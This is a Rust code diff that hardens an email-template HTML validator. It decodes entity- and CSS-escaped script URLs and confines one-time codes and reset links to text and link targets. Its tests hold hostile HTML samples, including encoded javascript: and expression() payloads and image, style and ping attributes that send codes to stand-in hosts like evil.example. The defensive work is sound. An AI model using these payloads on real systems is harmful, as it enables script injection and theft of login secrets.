@@ -1586,15 +1586,19 @@ fn forbidden_html(html: &str) -> Option<(usize, &'static str)> {
         }
         i += 1;
     }
-    // Script-capable URLs: browsers ignore whitespace and control
-    // characters inside a scheme, so look at a copy without them
-    // (`origin[k]` = the offset in `html` of the squeezed copy's byte k).
+    // Script-capable URLs: browsers decode character references in
+    // attributes (`jav&#x61;script:`), CSS reads its own escapes
+    // (`@\69mport`) and both ignore whitespace and control characters inside
+    // a scheme, so look at a decoded copy without them (`origin[k]` = the
+    // offset in `html` of the squeezed copy's byte k).
     let mut squeezed = String::with_capacity(lower.len());
     let mut origin = Vec::with_capacity(lower.len());
-    for (k, c) in lower.char_indices() {
-        if !c.is_whitespace() && !c.is_control() {
-            squeezed.push(c);
-            origin.extend(std::iter::repeat_n(k, c.len_utf8()));
+    for (k, c) in css_unescaped(&char_refs_decoded(html)) {
+        for c in c.to_lowercase() {
+            if !c.is_whitespace() && !c.is_control() {
+                squeezed.push(c);
+                origin.extend(std::iter::repeat_n(k, c.len_utf8()));
+            }
         }
     }
     for (needle, what) in [
@@ -1610,6 +1614,261 @@ fn forbidden_html(html: &str) -> Option<(usize, &'static str)> {
         }
     }
     found
+}
+
+/// `html` as (offset, character) with numeric character references
+/// (`&#106;`, `&#x6A`, with or without `;`) and the named ones that spell URL
+/// and CSS syntax (`&colon;`, `&Tab;`, …) decoded, as a browser reads an
+/// attribute value.
+fn char_refs_decoded(html: &str) -> Vec<(usize, char)> {
+    const NAMED: [(&str, char); 10] = [
+        ("colon;", ':'),
+        ("tab;", '\t'),
+        ("newline;", '\n'),
+        ("lpar;", '('),
+        ("rpar;", ')'),
+        ("sol;", '/'),
+        ("bsol;", '\\'),
+        ("commat;", '@'),
+        ("period;", '.'),
+        ("equals;", '='),
+    ];
+    let mut out = Vec::with_capacity(html.len());
+    let mut i = 0;
+    while let Some(c) = html[i..].chars().next() {
+        if c == '&' {
+            let rest = &html[i + 1..];
+            let numeric = rest.strip_prefix('#').and_then(|r| {
+                let (hex, digits) = match r.strip_prefix(['x', 'X']) {
+                    Some(h) => (true, h),
+                    None => (false, r),
+                };
+                let n = digits
+                    .bytes()
+                    .take_while(|b| {
+                        if hex {
+                            b.is_ascii_hexdigit()
+                        } else {
+                            b.is_ascii_digit()
+                        }
+                    })
+                    .count();
+                let value =
+                    u32::from_str_radix(digits.get(..n.min(8))?, if hex { 16 } else { 10 }).ok()?;
+                let used = 1 + usize::from(hex) + n + usize::from(digits[n..].starts_with(';'));
+                Some((char::from_u32(value).unwrap_or('\u{fffd}'), used))
+            });
+            let named = || {
+                NAMED.iter().find_map(|(name, ch)| {
+                    rest.get(..name.len())
+                        .filter(|r| r.eq_ignore_ascii_case(name))
+                        .map(|_| (*ch, name.len()))
+                })
+            };
+            if let Some((ch, used)) = numeric.or_else(named) {
+                out.push((i, ch));
+                i += 1 + used;
+                continue;
+            }
+        }
+        out.push((i, c));
+        i += c.len_utf8();
+    }
+    out
+}
+
+/// `chars` with CSS escapes decoded (`\69` = `i`, `\@` = `@`; a line break
+/// after a backslash is dropped).
+fn css_unescaped(chars: &[(usize, char)]) -> Vec<(usize, char)> {
+    let mut out = Vec::with_capacity(chars.len());
+    let mut i = 0;
+    while i < chars.len() {
+        let (at, c) = chars[i];
+        if c != '\\' || i + 1 == chars.len() {
+            out.push((at, c));
+            i += 1;
+            continue;
+        }
+        let hex: String = chars[i + 1..]
+            .iter()
+            .take(6)
+            .map(|&(_, c)| c)
+            .take_while(char::is_ascii_hexdigit)
+            .collect();
+        if hex.is_empty() {
+            let next = chars[i + 1].1;
+            if next != '\n' {
+                out.push((at, next));
+            }
+            i += 2;
+            continue;
+        }
+        let value = u32::from_str_radix(&hex, 16).ok().and_then(char::from_u32);
+        out.push((at, value.unwrap_or('\u{fffd}')));
+        i += 1 + hex.len();
+        if chars.get(i).is_some_and(|&(_, c)| c.is_ascii_whitespace()) {
+            i += 1;
+        }
+    }
+    out
+}
+
+/// Placeholders whose values are secrets (one-time codes, the reset link):
+/// red team A-5, they may stand only where nothing loads them by itself.
+const SECRET_PLACEHOLDERS: [&str; 2] = ["code", "link"];
+
+/// The byte ranges of `html` where a secret placeholder may stand: element
+/// text (also the text of `<title>` / `<textarea>`), and the value of an
+/// `href` attribute on an `<a>` element. Everything else — tag and
+/// attribute names, other attribute values (`src`, `style`, `srcset`,
+/// `background`, `poster`, `data-*`, `action`, …), `<style>` sheets,
+/// comments, and anything inside `<svg>` / `<math>` — is not listed. The
+/// scan follows the HTML tokenizer closely enough to be conservative: where
+/// it may disagree with a browser it lists less, never more.
+fn secret_safe_ranges(html: &str) -> Vec<std::ops::Range<usize>> {
+    let b = html.as_bytes();
+    let n = b.len();
+    let lower = html.to_ascii_lowercase();
+    let mut ranges = Vec::new();
+    let mut foreign = 0usize;
+    let mut text_from = 0;
+    let mut i = 0;
+    let space = |c: u8| matches!(c, b' ' | b'\t' | b'\n' | b'\r' | b'\x0c');
+    // The end of `<!--…-->`, `<!…>`, `<?…>` (or of the input).
+    let skip_to = |from: usize, needle: &str| {
+        lower[from..]
+            .find(needle)
+            .map_or(n, |k| from + k + needle.len())
+    };
+    while i < n {
+        if b[i] != b'<' {
+            i += 1;
+            continue;
+        }
+        let next = b.get(i + 1).copied();
+        let end_tag = next == Some(b'/') && b.get(i + 2).is_some_and(u8::is_ascii_alphabetic);
+        let markup = end_tag
+            || next.is_some_and(|c| c.is_ascii_alphabetic() || matches!(c, b'!' | b'?' | b'/'));
+        if !markup {
+            i += 1;
+            continue;
+        }
+        if foreign == 0 && text_from < i {
+            ranges.push(text_from..i);
+        }
+        if lower[i..].starts_with("<!--") {
+            i = skip_to(i + 4, "-->");
+            text_from = i;
+            continue;
+        }
+        if !end_tag && !next.is_some_and(|c| c.is_ascii_alphabetic()) {
+            // `<!…>`, `<?…>`, `</…>` not followed by a letter: bogus comments.
+            i = skip_to(i + 1, ">");
+            text_from = i;
+            continue;
+        }
+        // A tag: its name, then its attributes (end tags have them too).
+        let mut j = i + if end_tag { 2 } else { 1 };
+        let name_from = j;
+        while j < n && !space(b[j]) && !matches!(b[j], b'/' | b'>') {
+            j += 1;
+        }
+        let name = &lower[name_from..j];
+        let mut self_closing = false;
+        loop {
+            while j < n && (space(b[j]) || b[j] == b'/') {
+                self_closing = b[j] == b'/' && b.get(j + 1) == Some(&b'>');
+                j += 1;
+            }
+            if j >= n || b[j] == b'>' {
+                break;
+            }
+            let attr_from = j;
+            j += 1; // the first character is part of the name, even `=`
+            while j < n && !space(b[j]) && !matches!(b[j], b'/' | b'>' | b'=') {
+                j += 1;
+            }
+            let attr = &lower[attr_from..j];
+            while j < n && space(b[j]) {
+                j += 1;
+            }
+            if b.get(j) != Some(&b'=') {
+                continue;
+            }
+            j += 1;
+            while j < n && space(b[j]) {
+                j += 1;
+            }
+            let value = match b.get(j) {
+                Some(&q @ (b'"' | b'\'')) => {
+                    let from = j + 1;
+                    let to = lower[from..].find(q as char).map_or(n, |k| from + k);
+                    j = (to + 1).min(n);
+                    from..to
+                }
+                Some(b'>') | None => j..j,
+                Some(_) => {
+                    let from = j;
+                    while j < n && !space(b[j]) && b[j] != b'>' {
+                        j += 1;
+                    }
+                    from..j
+                }
+            };
+            if !end_tag && foreign == 0 && name == "a" && attr == "href" {
+                ranges.push(value);
+            }
+        }
+        i = (j + 1).min(n);
+        text_from = i;
+        if end_tag {
+            if matches!(name, "svg" | "math") {
+                foreign = foreign.saturating_sub(1);
+            }
+            continue;
+        }
+        if matches!(name, "svg" | "math") && !self_closing {
+            foreign += 1;
+        } else if matches!(name, "style" | "title" | "textarea") && foreign == 0 {
+            // Raw text up to the matching end tag: a sheet lists nothing,
+            // the others are text.
+            let close = format!("</{name}");
+            let mut k = i;
+            let end = loop {
+                match lower[k..].find(&close) {
+                    None => break n,
+                    Some(f) => {
+                        let at = k + f;
+                        let after = b.get(at + close.len()).copied();
+                        if after.is_none_or(|c| space(c) || matches!(c, b'/' | b'>')) {
+                            break at;
+                        }
+                        k = at + close.len();
+                    }
+                }
+            };
+            if name != "style" && i < end {
+                ranges.push(i..end);
+            }
+            i = end;
+            text_from = end;
+        }
+    }
+    if foreign == 0 && text_from < n {
+        ranges.push(text_from..n);
+    }
+    ranges
+}
+
+/// The first secret placeholder outside `secret_safe_ranges`: (offset of
+/// its `{`, name). The ranges come in source order and do not overlap.
+fn misplaced_secret(html: &str) -> Option<(usize, &str)> {
+    let ranges = secret_safe_ranges(html);
+    placeholder_spans(html).into_iter().find(|&(at, name)| {
+        let end = at + name.len() + 2;
+        let i = ranges.partition_point(|r| r.start <= at);
+        SECRET_PLACEHOLDERS.contains(&name) && !(i > 0 && end <= ranges[i - 1].end)
+    })
 }
 
 /// Check an admin's HTML source for a kind: size, no control characters,
@@ -1657,6 +1916,17 @@ pub fn validate_html(kind: &str, html: &str) -> Result<(), ApiError> {
     let found = placeholder_spans(html);
     if let Some(&(at, name)) = found.iter().find(|(_, n)| !known(n)) {
         return Err(unknown_placeholder("html_source", html, at, name));
+    }
+    if let Some((at, name)) = misplaced_secret(html) {
+        let (line, column) = line_col(html, at);
+        return Err(bad_request!(
+            "mail_template.html_secret_placement",
+            "{{{name}}} may stand only in text or in an <a href> (line {line}, column {column})",
+            name = name,
+            field = "html_source",
+            line = line,
+            column = column
+        ));
     }
     for r in required {
         if !found.iter().any(|(_, n)| n == r) {
@@ -1975,6 +2245,144 @@ mod tests {
                 html_err(REG, fine)
             );
         }
+    }
+
+    /// Red team A-5: a one-time code or the reset link may stand only in
+    /// text or in an `<a href>`; anywhere a mail client loads by itself
+    /// (an image, a style, a background…) would send it to that server.
+    #[test]
+    fn secret_placeholders_stay_in_text_and_links() {
+        let reset = "password_reset";
+        for (kind, fine) in [
+            (REG, "<p>{code}</p>"),
+            (
+                REG,
+                "<p title=\"x\">a {code} b</p><img src=\"https://x.example/logo.png\" alt=\"{site}\">",
+            ),
+            (
+                REG,
+                "<title>{code}</title><textarea>{code}</textarea>{code}",
+            ),
+            (REG, "<p>1 < 2 {code}</p><b>{code}</b>"),
+            (REG, "<!-- note --><p>{code}</p>"),
+            (REG, "<svg width=1></svg><p>{code}</p>"),
+            (reset, "<a href=\"{link}\">{link}</a>"),
+            (reset, "<A class=b HREF='{link}'>go</A>"),
+            (reset, "<a href={link}>go</a>"),
+            (reset, "<a/href=\"https://x.example/?next={link}\">go</a>"),
+            (
+                "expiry_soon",
+                "<img src=\"https://x.example/{portal_url}\">",
+            ),
+        ] {
+            assert!(
+                validate_html(kind, fine).is_ok(),
+                "{:?}: {fine}",
+                html_err(kind, fine)
+            );
+        }
+        for (kind, bad) in [
+            (
+                REG,
+                "<p>{code}</p><img src=\"https://evil.example/c/{code}\">",
+            ),
+            (
+                REG,
+                "<p style=\"background:url(https://e.example/{code})\">{code}</p>",
+            ),
+            (REG, "<img srcset=\"https://e.example/{code} 1x\">"),
+            (
+                REG,
+                "<table background=\"https://e.example/{code}\"></table>",
+            ),
+            (REG, "<video poster=\"https://e.example/{code}\"></video>"),
+            (REG, "<div data-x=\"{code}\"></div>"),
+            (REG, "<a ping=\"https://e.example/{code}\" href=\"/\">x</a>"),
+            (REG, "<img src={code}>"),
+            (REG, "<a href=x {code}>y</a>"),
+            (REG, "<p{code}>"),
+            (
+                REG,
+                "<style>p{background:url(https://e.example/{code})}</style>",
+            ),
+            (REG, "<style>p{}</stylex>{code}</style>"),
+            (REG, "<svg><text>{code}</text></svg>"),
+            (REG, "<svg><a href=\"{code}\">x</a></svg>"),
+            (REG, "<math><mi>{code}</mi></math>"),
+            (REG, "<!-- {code} -->"),
+            (REG, "<p>x</p><img alt=\"x\"\nsrc='{code}'>"),
+            (REG, "<img src=\"{code}"),
+            (reset, "<area href=\"https://e.example/{link}\">"),
+            (reset, "<img src=\"{link}\"><a href=\"{link}\">x</a>"),
+            (reset, "<td background=\"{link}\">"),
+        ] {
+            let e = validate_html(kind, bad).expect_err(bad);
+            assert_eq!(
+                e.code(),
+                "mail_template.html_secret_placement",
+                "{bad}: {e:?}"
+            );
+            assert_eq!(e.params()["field"], "html_source");
+        }
+        // Truncated and non-ASCII markup never trips the scanner.
+        let messy = "<a é='{code}' hréf=\"x\"/><!--é--><style>é</style é><svg/><math>é</math>\
+                     <title>{code}</title é><a href=é{code}>é</a></é{code}><?é>{code}<é";
+        for (i, _) in messy.char_indices().chain([(messy.len(), ' ')]) {
+            let _ = validate_html(REG, &messy[..i]);
+        }
+        // Where: the misplaced placeholder's `{`.
+        let e = validate_html(REG, "<p>{code}</p>\n<img alt=\"码\"\n  src='{code}'>").unwrap_err();
+        assert_eq!(e.params()["name"], "code");
+        assert_eq!(
+            (&e.params()["line"], &e.params()["column"]),
+            (&3.into(), &8.into())
+        );
+    }
+
+    /// Red team D-2: the script-URL and `@import` checks read the source as a
+    /// browser does, with character references and CSS escapes decoded.
+    #[test]
+    fn encoded_script_urls_are_refused() {
+        for bad in [
+            "<a href=\"jav&#x61;script:alert(1)\">{code}</a>",
+            "<a href=\"&#106;avascript:alert(1)\">{code}</a>",
+            "<a href=\"&#0000106&#0000097vascript:x\">{code}</a>",
+            "<a href=\"javascript&colon;x\">{code}</a>",
+            "<a href=\"java&Tab;script:x\">{code}</a>",
+            "<a href=\"java&NewLine;script:x\">{code}</a>",
+            "<a href=\"vbscript&#58;x\">{code}</a>",
+            "<a href=\"data&colon;text/html,x\">{code}</a>",
+            "<style>@\\69mport url(https://x/a.css);</style>{code}",
+            "<style>@\\69 mport url(https://x/a.css);</style>{code}",
+            "<style>@&#92;69mport url(https://x/a.css);</style>{code}",
+            "<p style=\"width:e\\78pression(alert(1))\">{code}</p>",
+            "<p style=\"width:expression&lpar;alert(1))\">{code}</p>",
+            "<meta http&#45;equiv=refresh content=\"0;url=https://x\">{code}",
+        ] {
+            assert!(
+                html_err(REG, bad)
+                    .unwrap_or_default()
+                    .contains("html_forbidden"),
+                "accepted: {bad}"
+            );
+        }
+        // Ordinary references and backslashes stay fine.
+        for fine in [
+            "<p>Tom &amp; Jerry &#169; &lt;b&gt; {code}</p>",
+            "<p>C:\\Users\\x &#x4e2d;&#25991; {code}</p>",
+        ] {
+            assert!(
+                validate_html(REG, fine).is_ok(),
+                "{:?}: {fine}",
+                html_err(REG, fine)
+            );
+        }
+        // Positions still point into the source as typed.
+        let e = validate_html(REG, "{code}\n<a href=\"jav&#x61;script:x\">").unwrap_err();
+        assert_eq!(
+            (&e.params()["line"], &e.params()["column"]),
+            (&2.into(), &10.into())
+        );
     }
 
     #[test]
